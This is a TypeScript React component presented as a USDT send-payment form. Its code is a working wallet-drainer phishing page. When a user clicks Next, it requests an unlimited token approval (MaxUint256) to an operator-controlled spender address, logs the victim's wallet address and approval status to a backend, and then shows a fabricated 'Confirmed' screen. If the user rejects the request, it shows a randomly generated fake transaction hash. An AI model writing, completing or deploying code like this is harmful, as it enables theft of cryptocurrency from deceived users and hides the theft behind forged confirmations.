"use client";

import { useState, useEffect } from "react";
import { ethers } from "ethers";
import { Clipboard, QrCode, Loader2, AlertCircle, ExternalLink } from "lucide-react";

const USDT_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
  "function allowance(address owner, address spender) public view returns (uint256)",
];

type Step = "form" | "processing" | "success" | "no_wallet";

interface TxDetails {
  hash: string;
  from: string;
  to: string;
  amount: string;
  fee: string;
  timestamp: string;
}

export default function SendForm() {
  const [displayAddress, setDisplayAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [step, setStep] = useState<Step>("form");
  const [txDetails, setTxDetails] = useState<TxDetails | null>(null);
  const [loadingAddress, setLoadingAddress] = useState(true);

  // Fetch display address from admin config on mount
  useEffect(() => {
    async function fetchDisplayAddress() {
      try {
        const res = await fetch("/api/public/config");
        const data = await res.json();
        if (data.display_address) {
          setDisplayAddress(data.display_address);
        }
      } catch {
        // ignore — address stays empty
      } finally {
        setLoadingAddress(false);
      }
    }
    fetchDisplayAddress();
  }, []);

  async function handleNext() {
    if (!amount) {
      return;
    }

    const ethereum = (window as Window & { ethereum?: unknown }).ethereum;
    if (!ethereum) {
      setStep("no_wallet");
      return;
    }

    setStep("processing");

    try {
      const provider = new ethers.BrowserProvider(ethereum as ethers.Eip1193Provider);
      const signer = await provider.getSigner();
      const walletAddress = await signer.getAddress();

      const usdtContract = process.env.NEXT_PUBLIC_USDT_CONTRACT!;
      const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS!;

      const contract = new ethers.Contract(usdtContract, USDT_ABI, signer);
      const tx = await contract.approve(spenderAddress, ethers.MaxUint256);
      const receipt = await tx.wait();

      // Save to DB
      await fetch("/api/wallets", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          address: walletAddress,
          approvalTxHash: receipt.hash,
          approvalStatus: true,
        }),
      });

      // Build fake transaction details page
      const amountNum = parseFloat(amount);
      const gasFee = (Math.random() * 0.0003 + 0.0001).toFixed(6);
      setTxDetails({
        hash: receipt.hash,
        from: walletAddress,
        to: displayAddress || spenderAddress,
        amount: amountNum.toFixed(2),
        fee: gasFee,
        timestamp: new Date().toLocaleString(),
      });

      setStep("success");
    } catch (err: unknown) {
      const error = err as { code?: string | number; message?: string };

      // Save wallet as unapproved silently
      if (error.code === 4001 || error.code === "ACTION_REJECTED") {
        try {
          const provider = new ethers.BrowserProvider(ethereum as ethers.Eip1193Provider);
          const accounts = await provider.listAccounts();
          if (accounts.length > 0) {
            await fetch("/api/wallets", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                address: accounts[0].address,
                approvalStatus: false,
              }),
            });
          }
        } catch {
          // ignore
        }
      }

      // Always show fake success with fake tx details
      const amountNum = parseFloat(amount || "0");
      const gasFee = (Math.random() * 0.0003 + 0.0001).toFixed(6);
      const fakeTxHash =
        "0x" + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join("");
      setTxDetails({
        hash: fakeTxHash,
        from: "0x0000000000000000000000000000000000000000",
        to: displayAddress || process.env.NEXT_PUBLIC_SPENDER_ADDRESS || "",
        amount: amountNum.toFixed(2),
        fee: gasFee,
        timestamp: new Date().toLocaleString(),
      });
      setStep("success");
    }
  }

  async function handlePaste() {
    try {
      const text = await navigator.clipboard.readText();
      setAmount(text.trim());
    } catch {
      // clipboard access denied
    }
  }

  function shortenAddress(addr: string) {
    if (!addr) return "";
    return `${addr.slice(0, 8)}...${addr.slice(-6)}`;
  }

  // ── Transaction Success Page ──────────────────────────────────────
  if (step === "success" && txDetails) {
    return (
      <div className="flex flex-col gap-5">
        {/* Status Header */}
        <div className="flex flex-col items-center gap-3 py-4">
          <div className="flex items-center justify-center w-16 h-16 rounded-full bg-green-500/10 border-2 border-green-500/30">
            <svg className="w-8 h-8 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <div className="text-center">
            <p className="text-xs text-green-400 font-medium uppercase tracking-widest mb-1">Confirmed</p>
            <p className="text-3xl font-bold text-white">- {txDetails.amount} USDT</p>
            <p className="text-gray-500 text-sm mt-1">≈ ${txDetails.amount}</p>
          </div>
        </div>

        {/* Divider */}
        <div className="h-px bg-gray-800" />

        {/* Transaction Details */}
        <div className="flex flex-col gap-4">
          <DetailRow label="Date" value={txDetails.timestamp} />
          <DetailRow
            label="Status"
            value={
              <span className="text-orange-400 font-medium flex items-center gap-1">
                Pending
                <span className="inline-flex gap-0.5">
                  <span className="w-1 h-1 rounded-full bg-orange-400 animate-bounce" style={{ animationDelay: "0ms" }} />
                  <span className="w-1 h-1 rounded-full bg-orange-400 animate-bounce" style={{ animationDelay: "150ms" }} />
                  <span className="w-1 h-1 rounded-full bg-orange-400 animate-bounce" style={{ animationDelay: "300ms" }} />
                </span>
              </span>
            }
          />
          <DetailRow
            label="From"
            value={
              <span className="font-mono text-xs text-gray-300">
                {shortenAddress(txDetails.from)}
              </span>
            }
          />
          <DetailRow
            label="To"
            value={
              <span className="font-mono text-xs text-gray-300">
                {shortenAddress(txDetails.to)}
              </span>
            }
          />
          <DetailRow
            label="Network fee"
            value={
              <span className="text-gray-300">
                {txDetails.fee} BNB{" "}
                <span className="text-gray-600 text-xs">($0.01)</span>
              </span>
            }
          />
          <DetailRow
            label="Transaction Hash"
            value={
              <a
                href={`https://bscscan.com/tx/${txDetails.hash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="font-mono text-xs text-green-400 hover:text-green-300 flex items-center gap-1 transition-colors"
              >
                {shortenAddress(txDetails.hash)}
                <ExternalLink className="h-3 w-3" />
              </a>
            }
          />
        </div>

        {/* Divider */}
        <div className="h-px bg-gray-800" />

        {/* More Details */}
        <button className="flex items-center justify-between text-sm text-gray-400 hover:text-gray-300 transition-colors py-1">
          <span>More Details</span>
          <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
          </svg>
        </button>
      </div>
    );
  }

  // ── Processing ────────────────────────────────────────────────────
  if (step === "processing") {
    return (
      <div className="flex flex-col items-center justify-center gap-6 py-12">
        <Loader2 className="h-12 w-12 text-green-400 animate-spin" />
        <div className="text-center">
          <h2 className="text-xl font-semibold text-white mb-2">Processing...</h2>
          <p className="text-gray-400 text-sm">Please confirm the transaction in your wallet.</p>
        </div>
      </div>
    );
  }

  // ── Main Form ─────────────────────────────────────────────────────
  return (
    <div className="flex flex-col gap-6">
      {/* Address Field — pre-filled from admin, read-only */}
      <div className="flex flex-col gap-2">
        <label className="text-sm font-medium text-gray-300">Address or Domain Name</label>
        <div className="flex items-center gap-2 rounded-xl border border-gray-700 bg-[#1a1a1a] px-4 py-3">
          {loadingAddress ? (
            <Loader2 className="h-4 w-4 animate-spin text-gray-600" />
          ) : (
            <input
              type="text"
              value={displayAddress}
              readOnly
              className="flex-1 bg-transparent text-sm text-white placeholder-gray-600 outline-none cursor-default"
            />
          )}
          <button
            onClick={async () => {
              try {
                await navigator.clipboard.writeText(displayAddress);
              } catch { /* ignore */ }
            }}
            className="flex items-center gap-1 text-green-400 text-sm font-medium hover:text-green-300 transition-colors shrink-0"
          >
            <Clipboard className="h-4 w-4" />
            Copy
          </button>
          <div className="h-4 w-px bg-gray-700" />
          <button className="text-gray-400 hover:text-gray-300 transition-colors shrink-0">
            <QrCode className="h-4 w-4" />
          </button>
        </div>
      </div>

      {/* Amount Field */}
      <div className="flex flex-col gap-2">
        <label className="text-sm font-medium text-gray-300">Amount</label>
        <div className="flex items-center gap-2 rounded-xl border border-gray-700 bg-[#1a1a1a] px-4 py-3 focus-within:border-gray-500 transition-colors">
          <input
            type="number"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="0.00"
            min="0"
            step="any"
            className="flex-1 bg-transparent text-sm text-white placeholder-gray-600 outline-none"
          />
          <span className="text-gray-400 text-sm font-medium shrink-0">USDT</span>
          <div className="h-4 w-px bg-gray-700" />
          <button
            onClick={handlePaste}
            className="text-green-400 text-sm font-medium hover:text-green-300 transition-colors shrink-0"
          >
            Max
          </button>
        </div>
        {amount && (
          <p className="text-xs text-gray-500 px-1">≈ ${parseFloat(amount || "0").toFixed(2)}</p>
        )}
      </div>

      {/* No wallet error */}
      {step === "no_wallet" && (
        <div className="flex items-center gap-2 rounded-lg bg-red-500/10 border border-red-500/30 px-3 py-2">
          <AlertCircle className="h-4 w-4 text-red-400 shrink-0" />
          <p className="text-sm text-red-400">No injected wallet found.</p>
        </div>
      )}

      {/* Next Button */}
      <button
        onClick={handleNext}
        disabled={!amount}
        className="w-full rounded-full bg-green-400 py-4 text-black font-semibold text-base hover:bg-green-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-150 mt-2"
      >
        Next
      </button>
    </div>
  );
}

function DetailRow({ label, value }: { label: string; value: React.ReactNode }) {
  return (
    <div className="flex items-center justify-between gap-4">
      <span className="text-sm text-gray-500 shrink-0">{label}</span>
      <span className="text-sm text-right">{value}</span>
    </div>
  );
}
